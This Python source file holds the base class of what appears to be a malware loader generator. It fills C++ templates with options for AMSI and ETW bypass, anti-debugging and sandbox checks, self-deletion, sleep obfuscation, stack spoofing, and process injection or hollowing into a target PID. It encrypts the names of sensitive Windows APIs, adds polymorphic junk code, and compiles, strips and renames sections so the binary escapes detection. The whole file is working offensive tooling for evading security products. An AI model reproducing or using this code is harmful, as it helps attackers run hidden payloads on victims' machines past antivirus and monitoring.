import os
import re
import shutil
import subprocess
import tempfile
from typing import Optional, List, Tuple
from pathlib import Path
from core.config_parser import Profile, ExtensionDef, _PERM_MAP
from core.crypto import djb2_hash
from core.crypto import aes_cbc_encrypt
from core.payload import generate_payload_declaration
from utils.helpers import colored_print

TEMPLATE_DIR = Path(__file__).parent.parent / "templates"


class BaseGenerator:
    def __init__(self, profile: Profile) -> None:
        self.profile = profile
        self.templates: dict[str, str] = {}
        self.xor_key: bytes = b""
        self._key_mask: bytes = b""
        self.override_payload: Optional[str] = None
        self._ext_includes: list[str] = []
        self._ext_defs: list[str] = []
        self._ext_sources: list[str] = []
        self._load_templates()

    def _load_templates(self) -> None:
        for fname in ["syscalls.hpp", "evasion.hpp", "injection.hpp",
                       "aes.hpp", "obfuscation.hpp", "loader.cpp", "sys.s"]:
            path = TEMPLATE_DIR / fname
            if path.exists():
                self.templates[fname] = path.read_text()
            else:
                raise FileNotFoundError(f"Template not found: {path}")

    def _load_template(self, name: str) -> str:
        path = TEMPLATE_DIR / name
        if path.exists():
            return path.read_text()
        raise FileNotFoundError(f"Template not found: {path}")

    def _hash_preprocess(self, content: str) -> str:
        pattern = re.compile(r'_hash\("([^"]+)"\)')
        def replacer(m: re.Match) -> str:
            s = m.group(1)
            h = djb2_hash(s)
            return f'0x{h:08x}ULL'
        return pattern.sub(replacer, content)

    def _resolve_perm(self, key: str) -> str:
        cfg = self.profile
        v = "RWX"
        if key == "PAYLOAD":
            v = cfg.pe.sections.payload
        elif key == "ALLOC":
            v = cfg.injection.alloc
        elif key == "EXEC":
            v = cfg.injection.exec
        elif key == "TEXT":
            v = cfg.pe.sections.text
        elif key == "DATA":
            v = cfg.pe.sections.data
        return _PERM_MAP.get(v.upper(), "PAGE_EXECUTE_READWRITE")

    def _inject_permissions(self, content: str) -> str:
        content = content.replace("__PERM_PAYLOAD__", self._resolve_perm("PAYLOAD"))
        content = content.replace("__PERM_ALLOC__",   self._resolve_perm("ALLOC"))
        content = content.replace("__PERM_EXEC__",    self._resolve_perm("EXEC"))
        content = content.replace("__PERM_TEXT__",    self._resolve_perm("TEXT"))
        content = content.replace("__PERM_DATA__",    self._resolve_perm("DATA"))
        return content

    def _process_extensions(self) -> None:
        for ext in self.profile.extensions:
            if not ext.name or not ext.path:
                continue
            ext_path = Path(ext.path)
            if not ext_path.is_absolute():
                ext_path = (Path.cwd() / ext.path).resolve()
            if not ext_path.exists():
                colored_print(f"[!] Extension not found: {ext_path}", "yellow")
                continue
            colored_print(f"    Extension: {ext.name} ({ext_path})", "cyan")

            include_guard = f"EXT_{ext.name.upper()}_HPP"
            self._ext_includes.append(f'#include "{ext_path}"')

            if ext.config:
                for k, v in ext.config.items():
                    ksan = re.sub(r'[^A-Za-z0-9_]', '_', k.upper())
                    vsan = str(v)
                    self._ext_defs.append(f"#define EXT_{ext.name.upper()}_{ksan} {vsan}")

            ext_dir = ext_path.parent
            for cpp in ext_dir.glob("*.cpp"):
                if cpp.name not in self._ext_sources:
                    self._ext_sources.append(str(cpp))
                    colored_print(f"    Extension source: {cpp.name}", "cyan")

    def _substitute_config_placeholders(self, content: str) -> str:
        cfg = self.profile

        content = content.replace("__AD_TIMING__",     "1" if cfg.anti_debug.timing else "0")
        content = content.replace("__AD_NTGLOBAL__",   "1" if cfg.anti_debug.peb else "0")
        content = content.replace("__AD_HWBP__",       "1" if cfg.anti_debug.hwbp else "0")
        content = content.replace("__AD_TRACER__",     "1" if cfg.anti_debug.timing else "0")
        content = content.replace("__AD_SANDBOX__",    "1" if cfg.anti_debug.sandbox else "0")
        content = content.replace("__AD_DELAYED__",    "1" if cfg.anti_debug.delayed_ms > 0 else "0")
        content = content.replace("__AD_DELAY_BASE__", str(cfg.anti_debug.delayed_ms))
        content = content.replace("__AD_DELAY_JITTER__", str(cfg.anti_debug.delay_jitter))
        content = content.replace("__AD_API_HAMMER__", "1" if cfg.anti_debug.hammer > 0 else "0")
        content = content.replace("__AD_API_ROUNDS__", str(cfg.anti_debug.hammer))

        content = content.replace("__SD_ENABLED__",  "1" if cfg.evasion.self_del else "0")
        content = content.replace("__SD_METHOD__",   str(cfg.evasion.self_del_method))

        content = content.replace("__AMSI_ENABLE__", "1" if cfg.evasion.amsi else "0")
        content = content.replace("__ETW_ENABLE__",  "1" if cfg.evasion.etw else "0")

        content = content.replace("__SS_ENABLE__", "1" if cfg.evasion.stack else "0")
        content = content.replace("__SS_DEPTH__",  str(cfg.evasion.spoof_depth))

        content = content.replace("__SLEEP_ENABLED__",  "1" if cfg.sleep.enabled else "0")
        content = content.replace("__SLEEP_BASE__",     str(cfg.sleep.ms))
        content = content.replace("__SLEEP_JITTER__",   str(cfg.sleep.jitter))
        content = content.replace("__SLEEP_OBF__",      "1" if cfg.sleep.obfuscate != "none" else "0")
        content = content.replace("__SLEEP_ALGO__",     f'"{cfg.sleep.obfuscate}"')

        content = content.replace("__TARGET_PID__", str(cfg.injection.pid))

        self._key_mask = os.urandom(len(self.xor_key))
        masked_key = bytes(self.xor_key[i] ^ self._key_mask[i] for i in range(len(self.xor_key)))
        content = content.replace("__XOR_MASK__",   ', '.join(f'0x{b:02x}' for b in self._key_mask))
        content = content.replace("__XOR_MASKED__", ', '.join(f'0x{b:02x}' for b in masked_key))
        content = content.replace("__KEY_LEN__", str(len(self.xor_key)))

        poly_flag = cfg.evasion.junk
        content = content.replace("__OBF_POLYMORPHIC__", "1" if poly_flag else "0")

        if poly_flag:
            import random as _jr
            _jr.seed(_jr.randint(0, 2**32))
            _jpool = list("abcdefghijklmnopqrstuvwxyz")
            _jidx = 0
            def _jn():
                nonlocal _jidx
                _jidx += 1
                i = _jidx
                if i < 26:
                    return "_" + _jpool[i]
                return "_" + _jpool[i % 26] + str(i // 26)

            junk_funcs_lines = []
            for _jf in range(_jr.randint(3, 6)):
                fn = "jf_" + _jr.choice("abcdefghijklmnopqrstuvwxyz") + _jr.choice("abcdefghijklmnopqrstuvwxyz") + _jr.choice("abcdefghijklmnopqrstuvwxyz")
                a = _jn(); b = _jn(); c = _jn(); d = _jn(); e = _jn()
                jr_a = _jr.randint(0, 999); jr_b = _jr.randint(0, 999)
                jr_loops = _jr.randint(3, 15); jr_add = _jr.randint(1, 50); jr_mod = _jr.randint(60, 200)
                jr_nop_len = _jr.randint(1, 8)
                jr_opq_val = _jr.randint(0, 999)
                junk_funcs_lines.append('static void __attribute__((used)) ' + fn + '(){')
                junk_funcs_lines.append('    volatile int ' + d + '=' + str(jr_opq_val) + ';')
                junk_funcs_lines.append('    if(OBF_ALWAYS_TRUE(' + d + ')){')
                junk_funcs_lines.append('        volatile int ' + a + ' = ' + str(jr_a) + ';')
                junk_funcs_lines.append('        volatile int ' + b + ' = ' + str(jr_b) + ';')
                junk_funcs_lines.append('        for(int ' + c + '=0;' + c + '<' + str(jr_loops) + ';' + c + '++){' + a + '=(' + a + '+' + b + ')%' + str(jr_mod) + ';' + b + '=(' + b + '+' + str(jr_add) + ')%' + str(jr_mod) + ';}')
                junk_funcs_lines.append('    }else{')
                for _ni in range(jr_nop_len):
                    junk_funcs_lines.append('        OBF_NOP;')
                junk_funcs_lines.append('        volatile int ' + e + '=0;')
                junk_funcs_lines.append('        if(OBF_ALWAYS_FALSE(' + e + ')){')
                junk_funcs_lines.append('            volatile int ' + a + '=0;')
                junk_funcs_lines.append('            for(int ' + c + '=0;' + c + '<5;' + c + '++)' + a + '+=' + e + ';')
                junk_funcs_lines.append('        }')
                junk_funcs_lines.append('    }')
                junk_funcs_lines.append('}')
            content = content.replace("__JUNK_FUNCS__", "\n".join(junk_funcs_lines))

            _jx = _jn(); _ji = _jn(); _jp = _jn()
            _jr_nops = _jr.randint(1, 4)
            junk_call_parts = []
            junk_call_parts.append('{')
            junk_call_parts.append('volatile int '+_jx+'=0;')
            junk_call_parts.append('volatile int '+_jp+'='+str(_jr.randint(0,999))+';')
            junk_call_parts.append('if(OBF_ALWAYS_TRUE('+_jp+')){')
            for _ni in range(_jr_nops):
                junk_call_parts.append('OBF_NOP;')
            junk_call_parts.append('for(int '+_ji+'=0;'+_ji+'<'+str(_jr.randint(5,30))+';'+_ji+'++)'+_jx+'+='+_ji+';')
            junk_call_parts.append('}')
            junk_call_parts.append('}')
            junk_call = ''.join(junk_call_parts)
        else:
            content = content.replace("__JUNK_FUNCS__", "")
            junk_call = ""
        content = content.replace("__JUNK_CALL__", junk_call)

        _aes_key = os.urandom(16)
        _aes_iv = os.urandom(16)
        _aes_mask = os.urandom(16)
        aes_key_masked = bytes(_aes_key[i] ^ _aes_mask[i] for i in range(16))
        aes_iv_masked = bytes(_aes_iv[i] ^ _aes_mask[(i+4)%16] for i in range(16))
        content = content.replace("__AES_KEY_MASK__", ', '.join(f'0x{b:02x}' for b in _aes_mask))
        content = content.replace("__AES_KEY_SEED__", ', '.join(f'0x{b:02x}' for b in aes_key_masked))
        content = content.replace("__AES_IV_SEED__",  ', '.join(f'0x{b:02x}' for b in aes_iv_masked))

        obfs_key_byte = os.urandom(1)[0]
        content = content.replace("__OBFS_KEY__", f'0x{obfs_key_byte:02x}')

        return content

    def _inject_obfuscation(self, content: str) -> str:
        cfg = self.profile
        obf_key = cfg.evasion.obf_key
        prefix = cfg.injection.prefix

        key_str = f'0x{obf_key:02x}'
        content = content.replace("__OBF_KEY__", key_str)

        prefix_bytes = ', '.join(f'0x{(ord(c) ^ obf_key):02x}' for c in prefix)
        prefix_len = len(prefix)
        prefix_buf = ((prefix_len // 16) + 1) * 16
        content = content.replace("__KNOWN_DLLS_PREFIX_BYTES__", "{" + prefix_bytes + "}")
        content = content.replace("__KNOWN_DLLS_PREFIX_LEN__", str(prefix_len))
        content = content.replace("__KNOWN_DLLS_PREFIX_BUF__", str(prefix_buf))

        hollow_path = cfg.injection.hollow_path
        content = content.replace("__HOLLOW_PATH__", f'L"{hollow_path}"')

        sb_min_ram = cfg.anti_debug.min_ram_mb * 1024 * 1024
        sb_min_disk = cfg.anti_debug.min_disk_gb * 1024 * 1024 * 1024
        sb_min_uptime = cfg.anti_debug.min_uptime_min * 60 * 1000
        content = content.replace("__SB_MIN_CPU__", str(cfg.anti_debug.min_cpu))
        content = content.replace("__SB_MIN_RAM__", f'{sb_min_ram}ULL')
        content = content.replace("__SB_MIN_DISK__", f'{sb_min_disk}ULL')
        content = content.replace("__SB_MIN_UPTIME__", str(sb_min_uptime))

        content = content.replace("__SELF_DEL_HANDLE__", str(cfg.evasion.self_del_handle))

        return content

    def _inject_extensions(self, content: str) -> str:
        if self._ext_defs:
            defs_str = "\n".join(self._ext_defs) + "\n"
            content = content.replace("// __EXT_DEFS__", defs_str)
        if self._ext_includes:
            inc_str = "\n".join(self._ext_includes)
            content = content.replace("// __EXT_INCLUDES__", inc_str)
        return content

    def _generate_obf_strings(self) -> str:
        str_list = self._get_string_list()
        obf_keys = os.urandom(16)
        obf_ivs = os.urandom(16)
        key_mask = os.urandom(16)
        enc_key_seed = bytes(obf_keys[i] ^ key_mask[i] for i in range(16))
        enc_iv_seed = bytes(obf_ivs[i] ^ key_mask[(i+4)%16] for i in range(16))
        structs = []

        for sid, sval in str_list:
            enc = aes_cbc_encrypt(sval.encode(), obf_keys, obf_ivs)
            ed = ', '.join(f'0x{b:02x}' for b in enc)
            kd = ', '.join(f'0x{b:02x}' for b in enc_key_seed)
            vd = ', '.join(f'0x{b:02x}' for b in enc_iv_seed)
            md = ', '.join(f'0x{b:02x}' for b in key_mask)
            structs.append(f'struct _{sid} {{')
            structs.append(f'    static const char* get(){{')
            structs.append(f'        static char buf[1024];')
            structs.append(f'        static bool init=false;')
            structs.append(f'        if(!init){{')
            structs.append(f'            init=true;')
            structs.append(f'            uint8_t k[16]={{{kd}}};')
            structs.append(f'            uint8_t v[16]={{{vd}}};')
            structs.append(f'            uint8_t m[16]={{{md}}};')
            structs.append(f'            for(int _i=0;_i<16;_i++){{k[_i]^=m[_i];v[_i]^=m[(_i+4)%16];}}')
            structs.append(f'            memset(m,0,16);')
            structs.append(f'            uint8_t d[{len(enc)}]={{{ed}}};')
            structs.append(f'            aegis::StrEnc se;')
            structs.append(f'            memcpy(se.key,k,16);memcpy(se.iv,v,16);')
            structs.append(f'            se.data=d;se.dlen={len(enc)};')
            structs.append(f'            char* _d=se.decrypt();')
            structs.append(f'            int sl=0;while(_d[sl])sl++;')
            structs.append(f'            int cp=sl<1023?sl:1023;')
            structs.append(f'            memcpy(buf,_d,cp);buf[cp]=0;')
            structs.append(f'            memset(k,0,16);memset(v,0,16);')
            structs.append(f'            delete[] _d;')
            structs.append(f'        }}')
            structs.append(f'        return buf;')
            structs.append(f'    }}')
            structs.append(f'}};')
        return '\n'.join(structs)

    def _get_string_list(self) -> List[Tuple[str, str]]:
        return [
            ("s_ntdll", "ntdll.dll"),
            ("s_amsi", "amsi.dll"),
            ("s_krnl", "kernel32.dll"),
            ("s_adv", "advapi32.dll"),
            ("s_nqip", "NtQueryInformationProcess"),
            ("s_nsip", "NtSetInformationProcess"),
            ("s_nos", "NtOpenSection"),
            ("s_ngct", "NtGetContextThread"),
            ("s_nsct", "NtSetContextThread"),
            ("s_rius", "RtlInitUnicodeString"),
            ("s_etw", "EtwEventWrite"),
            ("s_asb", "AmsiScanBuffer"),
            ("s_ha", "HeapAlloc"),
            ("s_hf", "HeapFree"),
            ("s_ro", "RegOpenKeyExW"),
            ("s_rcs", "RtlCaptureStackBackTrace"),
            ("s_nde", "NtDelayExecution"),
            ("s_ncs", "NtCreateSection"),
            ("s_nmv", "NtMapViewOfSection"),
            ("s_npv", "NtProtectVirtualMemory"),
            ("s_nuv", "NtUnmapViewOfSection"),
            ("s_nop", "NtOpenProcess"),
            ("s_nav", "NtAllocateVirtualMemory"),
            ("s_nwv", "NtWriteVirtualMemory"),
            ("s_nct", "NtCreateThreadEx"),
            ("s_nqa", "NtQueueApcThread"),
            ("s_ncl", "NtClose"),
        ]

    def _generate_target_dll_function(self) -> str:
        td = self.profile.injection.dll
        obf_key = self.profile.evasion.obf_key
        xor_bytes = ', '.join(f'0x{ord(c)^obf_key:02x}' for c in td)
        td_len = len(td)
        return f'''static const char* _get_td(){{
    static char _b[{td_len + 1}];
    static bool _n=false;
    if(!_n){{
        _n=true;
        [[maybe_unused]] volatile unsigned char _xk={hex(obf_key)};
        unsigned char _x[]={{{xor_bytes},{hex(obf_key)}}};
        int _i=0;
        while(((volatile unsigned char*)_x)[_i]!=_xk){{_b[_i]=((volatile unsigned char*)_x)[_i]^_xk;_i++;}}
        _b[_i]=0;
    }}
    return _b;
}}'''

    def _process_file(self, content: str) -> str:
        content = self._hash_preprocess(content)
        content = self._substitute_config_placeholders(content)
        content = self._inject_obfuscation(content)
        content = self._inject_permissions(content)
        content = self._inject_extensions(content)
        if "__OBF_STRINGS__" in content:
            content = content.replace("__OBF_STRINGS__", self._generate_obf_strings())
        td_func = self._generate_target_dll_function()
        if "CFG_TARGET_DLL" in content or "__PAYLOAD_DECL__" in content:
            if "static InjCtx _ctx;" in content:
                aes_helper = self._generate_aes_helper()
                content = content.replace("static InjCtx _ctx;",
                    f"{td_func}\n{aes_helper}\nstatic InjCtx _ctx;")
            else:
                content = td_func + "\n" + content
        content = content.replace("__TARGET_DLL__", "_get_td()")
        content = self._replace_inj_method(content)
        return content

    def _generate_aes_helper(self) -> str:
        return '''__attribute__((unused)) static char* _decrypt_str(const unsigned char* data,int dlen,const unsigned char* key,const unsigned char* iv){
    uint8_t w[176];aegis::_ke(key,w);
    int plen=dlen;
    uint8_t* tmp=new uint8_t[plen];
    memcpy(tmp,data,plen);
    uint8_t prev[16];memcpy(prev,iv,16);
    for(int i=0;i<plen;i+=16){
        uint8_t block[16];aegis::_dc(tmp+i,block,w);
        for(int j=0;j<16;j++){tmp[i+j]=block[j]^prev[j];}
        memcpy(prev,tmp+i,16);
    }
    int pad=tmp[plen-1];
    int rlen=plen-pad;
    char* r=new char[rlen+1];
    memcpy(r,tmp,rlen);r[rlen]=0;
    memset(tmp,0,plen);delete[] tmp;
    return r;
}'''

    def _replace_inj_method(self, content: str) -> str:
        method = self.profile.injection.method
        obf_key = self.profile.evasion.obf_key
        xor_bytes = ', '.join(f'0x{ord(c)^obf_key:02x}' for c in method)
        mlen = len(method)
        func_code = (
            f'static const char* _get_im(){{'
            f'static char _m[{mlen+1}];'
            f'static bool _mi=false;'
            f'if(!_mi){{'
            f'_mi=true;'
            f'[[maybe_unused]] volatile unsigned char _xmk={hex(obf_key)};'
            f'unsigned char _mx[]={{{xor_bytes},{hex(obf_key)}}};'
            f'int _j=0;'
            f'while(((volatile unsigned char*)_mx)[_j]!=_xmk){{_m[_j]=((volatile unsigned char*)_mx)[_j]^_xmk;_j++;}}'
            f'_m[_j]=0;'
            f'}}'
            f'return _m;'
            f'}}'
        )
        content = content.replace("__INJ_METHOD__", "_get_im()")
        content = content.replace("static InjCtx _ctx;",
            f"{func_code}\nstatic InjCtx _ctx;")
        return content

    def _write_temp_source(self, workdir: str) -> None:
        ldr = self._load_template("loader.cpp")
        ldr = self._process_file(ldr)
        (Path(workdir) / "loader.cpp").write_text(ldr)

        for hpp in ["syscalls.hpp", "evasion.hpp", "injection.hpp"]:
            content = self._load_template(hpp)
            content = self._hash_preprocess(content)
            content = self._inject_permissions(content)
            content = self._inject_obfuscation(content)
            (Path(workdir) / hpp).write_text(content)

        for fname in ["aes.hpp", "obfuscation.hpp", "sys.s"]:
            content = self._load_template(fname)
            (Path(workdir) / fname).write_text(content)

    def _compile(self, source_dir: str, output_path: str, output_type: str = "exe") -> bool:
        cc = self.profile.compiler.cc
        src = Path(source_dir)
        out = Path(output_path)

        flags = self.profile.compiler.flags

        cmd = [cc, str(src / "loader.cpp"), str(src / "sys.s"),
               f"-I{src}", "-o", str(out)] + flags.split()

        for ext_src in self._ext_sources:
            cmd.insert(-1, str(ext_src))

        colored_print(f"[+] Compiling: {' '.join(cmd)}", "green")
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode != 0:
            colored_print(f"[-] Compilation failed:\n{result.stderr}", "red")
            return False

        strip_cmd = ["x86_64-w64-mingw32-strip",
                      "--strip-all", "--remove-section=.comment",
                      "--remove-section=.note", str(out)]
        strip_result = subprocess.run(strip_cmd, capture_output=True, text=True)
        if strip_result.returncode != 0:
            colored_print(f"[!] Strip warning: {strip_result.stderr}", "yellow")

        objcopy_cmd = ["x86_64-w64-mingw32-objcopy",
                       "--remove-section=.rsrc", str(out)]
        subprocess.run(objcopy_cmd, capture_output=True, text=True)

        if self.profile.pe.rename_sections:
            section_names = list(self.profile.pe.section_list)
            random_sections = ["." + os.urandom(4).hex() for _ in section_names]
            for old_name, new_name in zip(section_names, random_sections):
                rename_cmd = ["x86_64-w64-mingw32-objcopy",
                              f"--rename-section={old_name}={new_name}", str(out)]
                subprocess.run(rename_cmd, capture_output=True, text=True)

        colored_print(f"[+] Output: {out} ({out.stat().st_size} bytes)", "green")
        return True

    def generate(self) -> Optional[str]:
        raise NotImplementedError
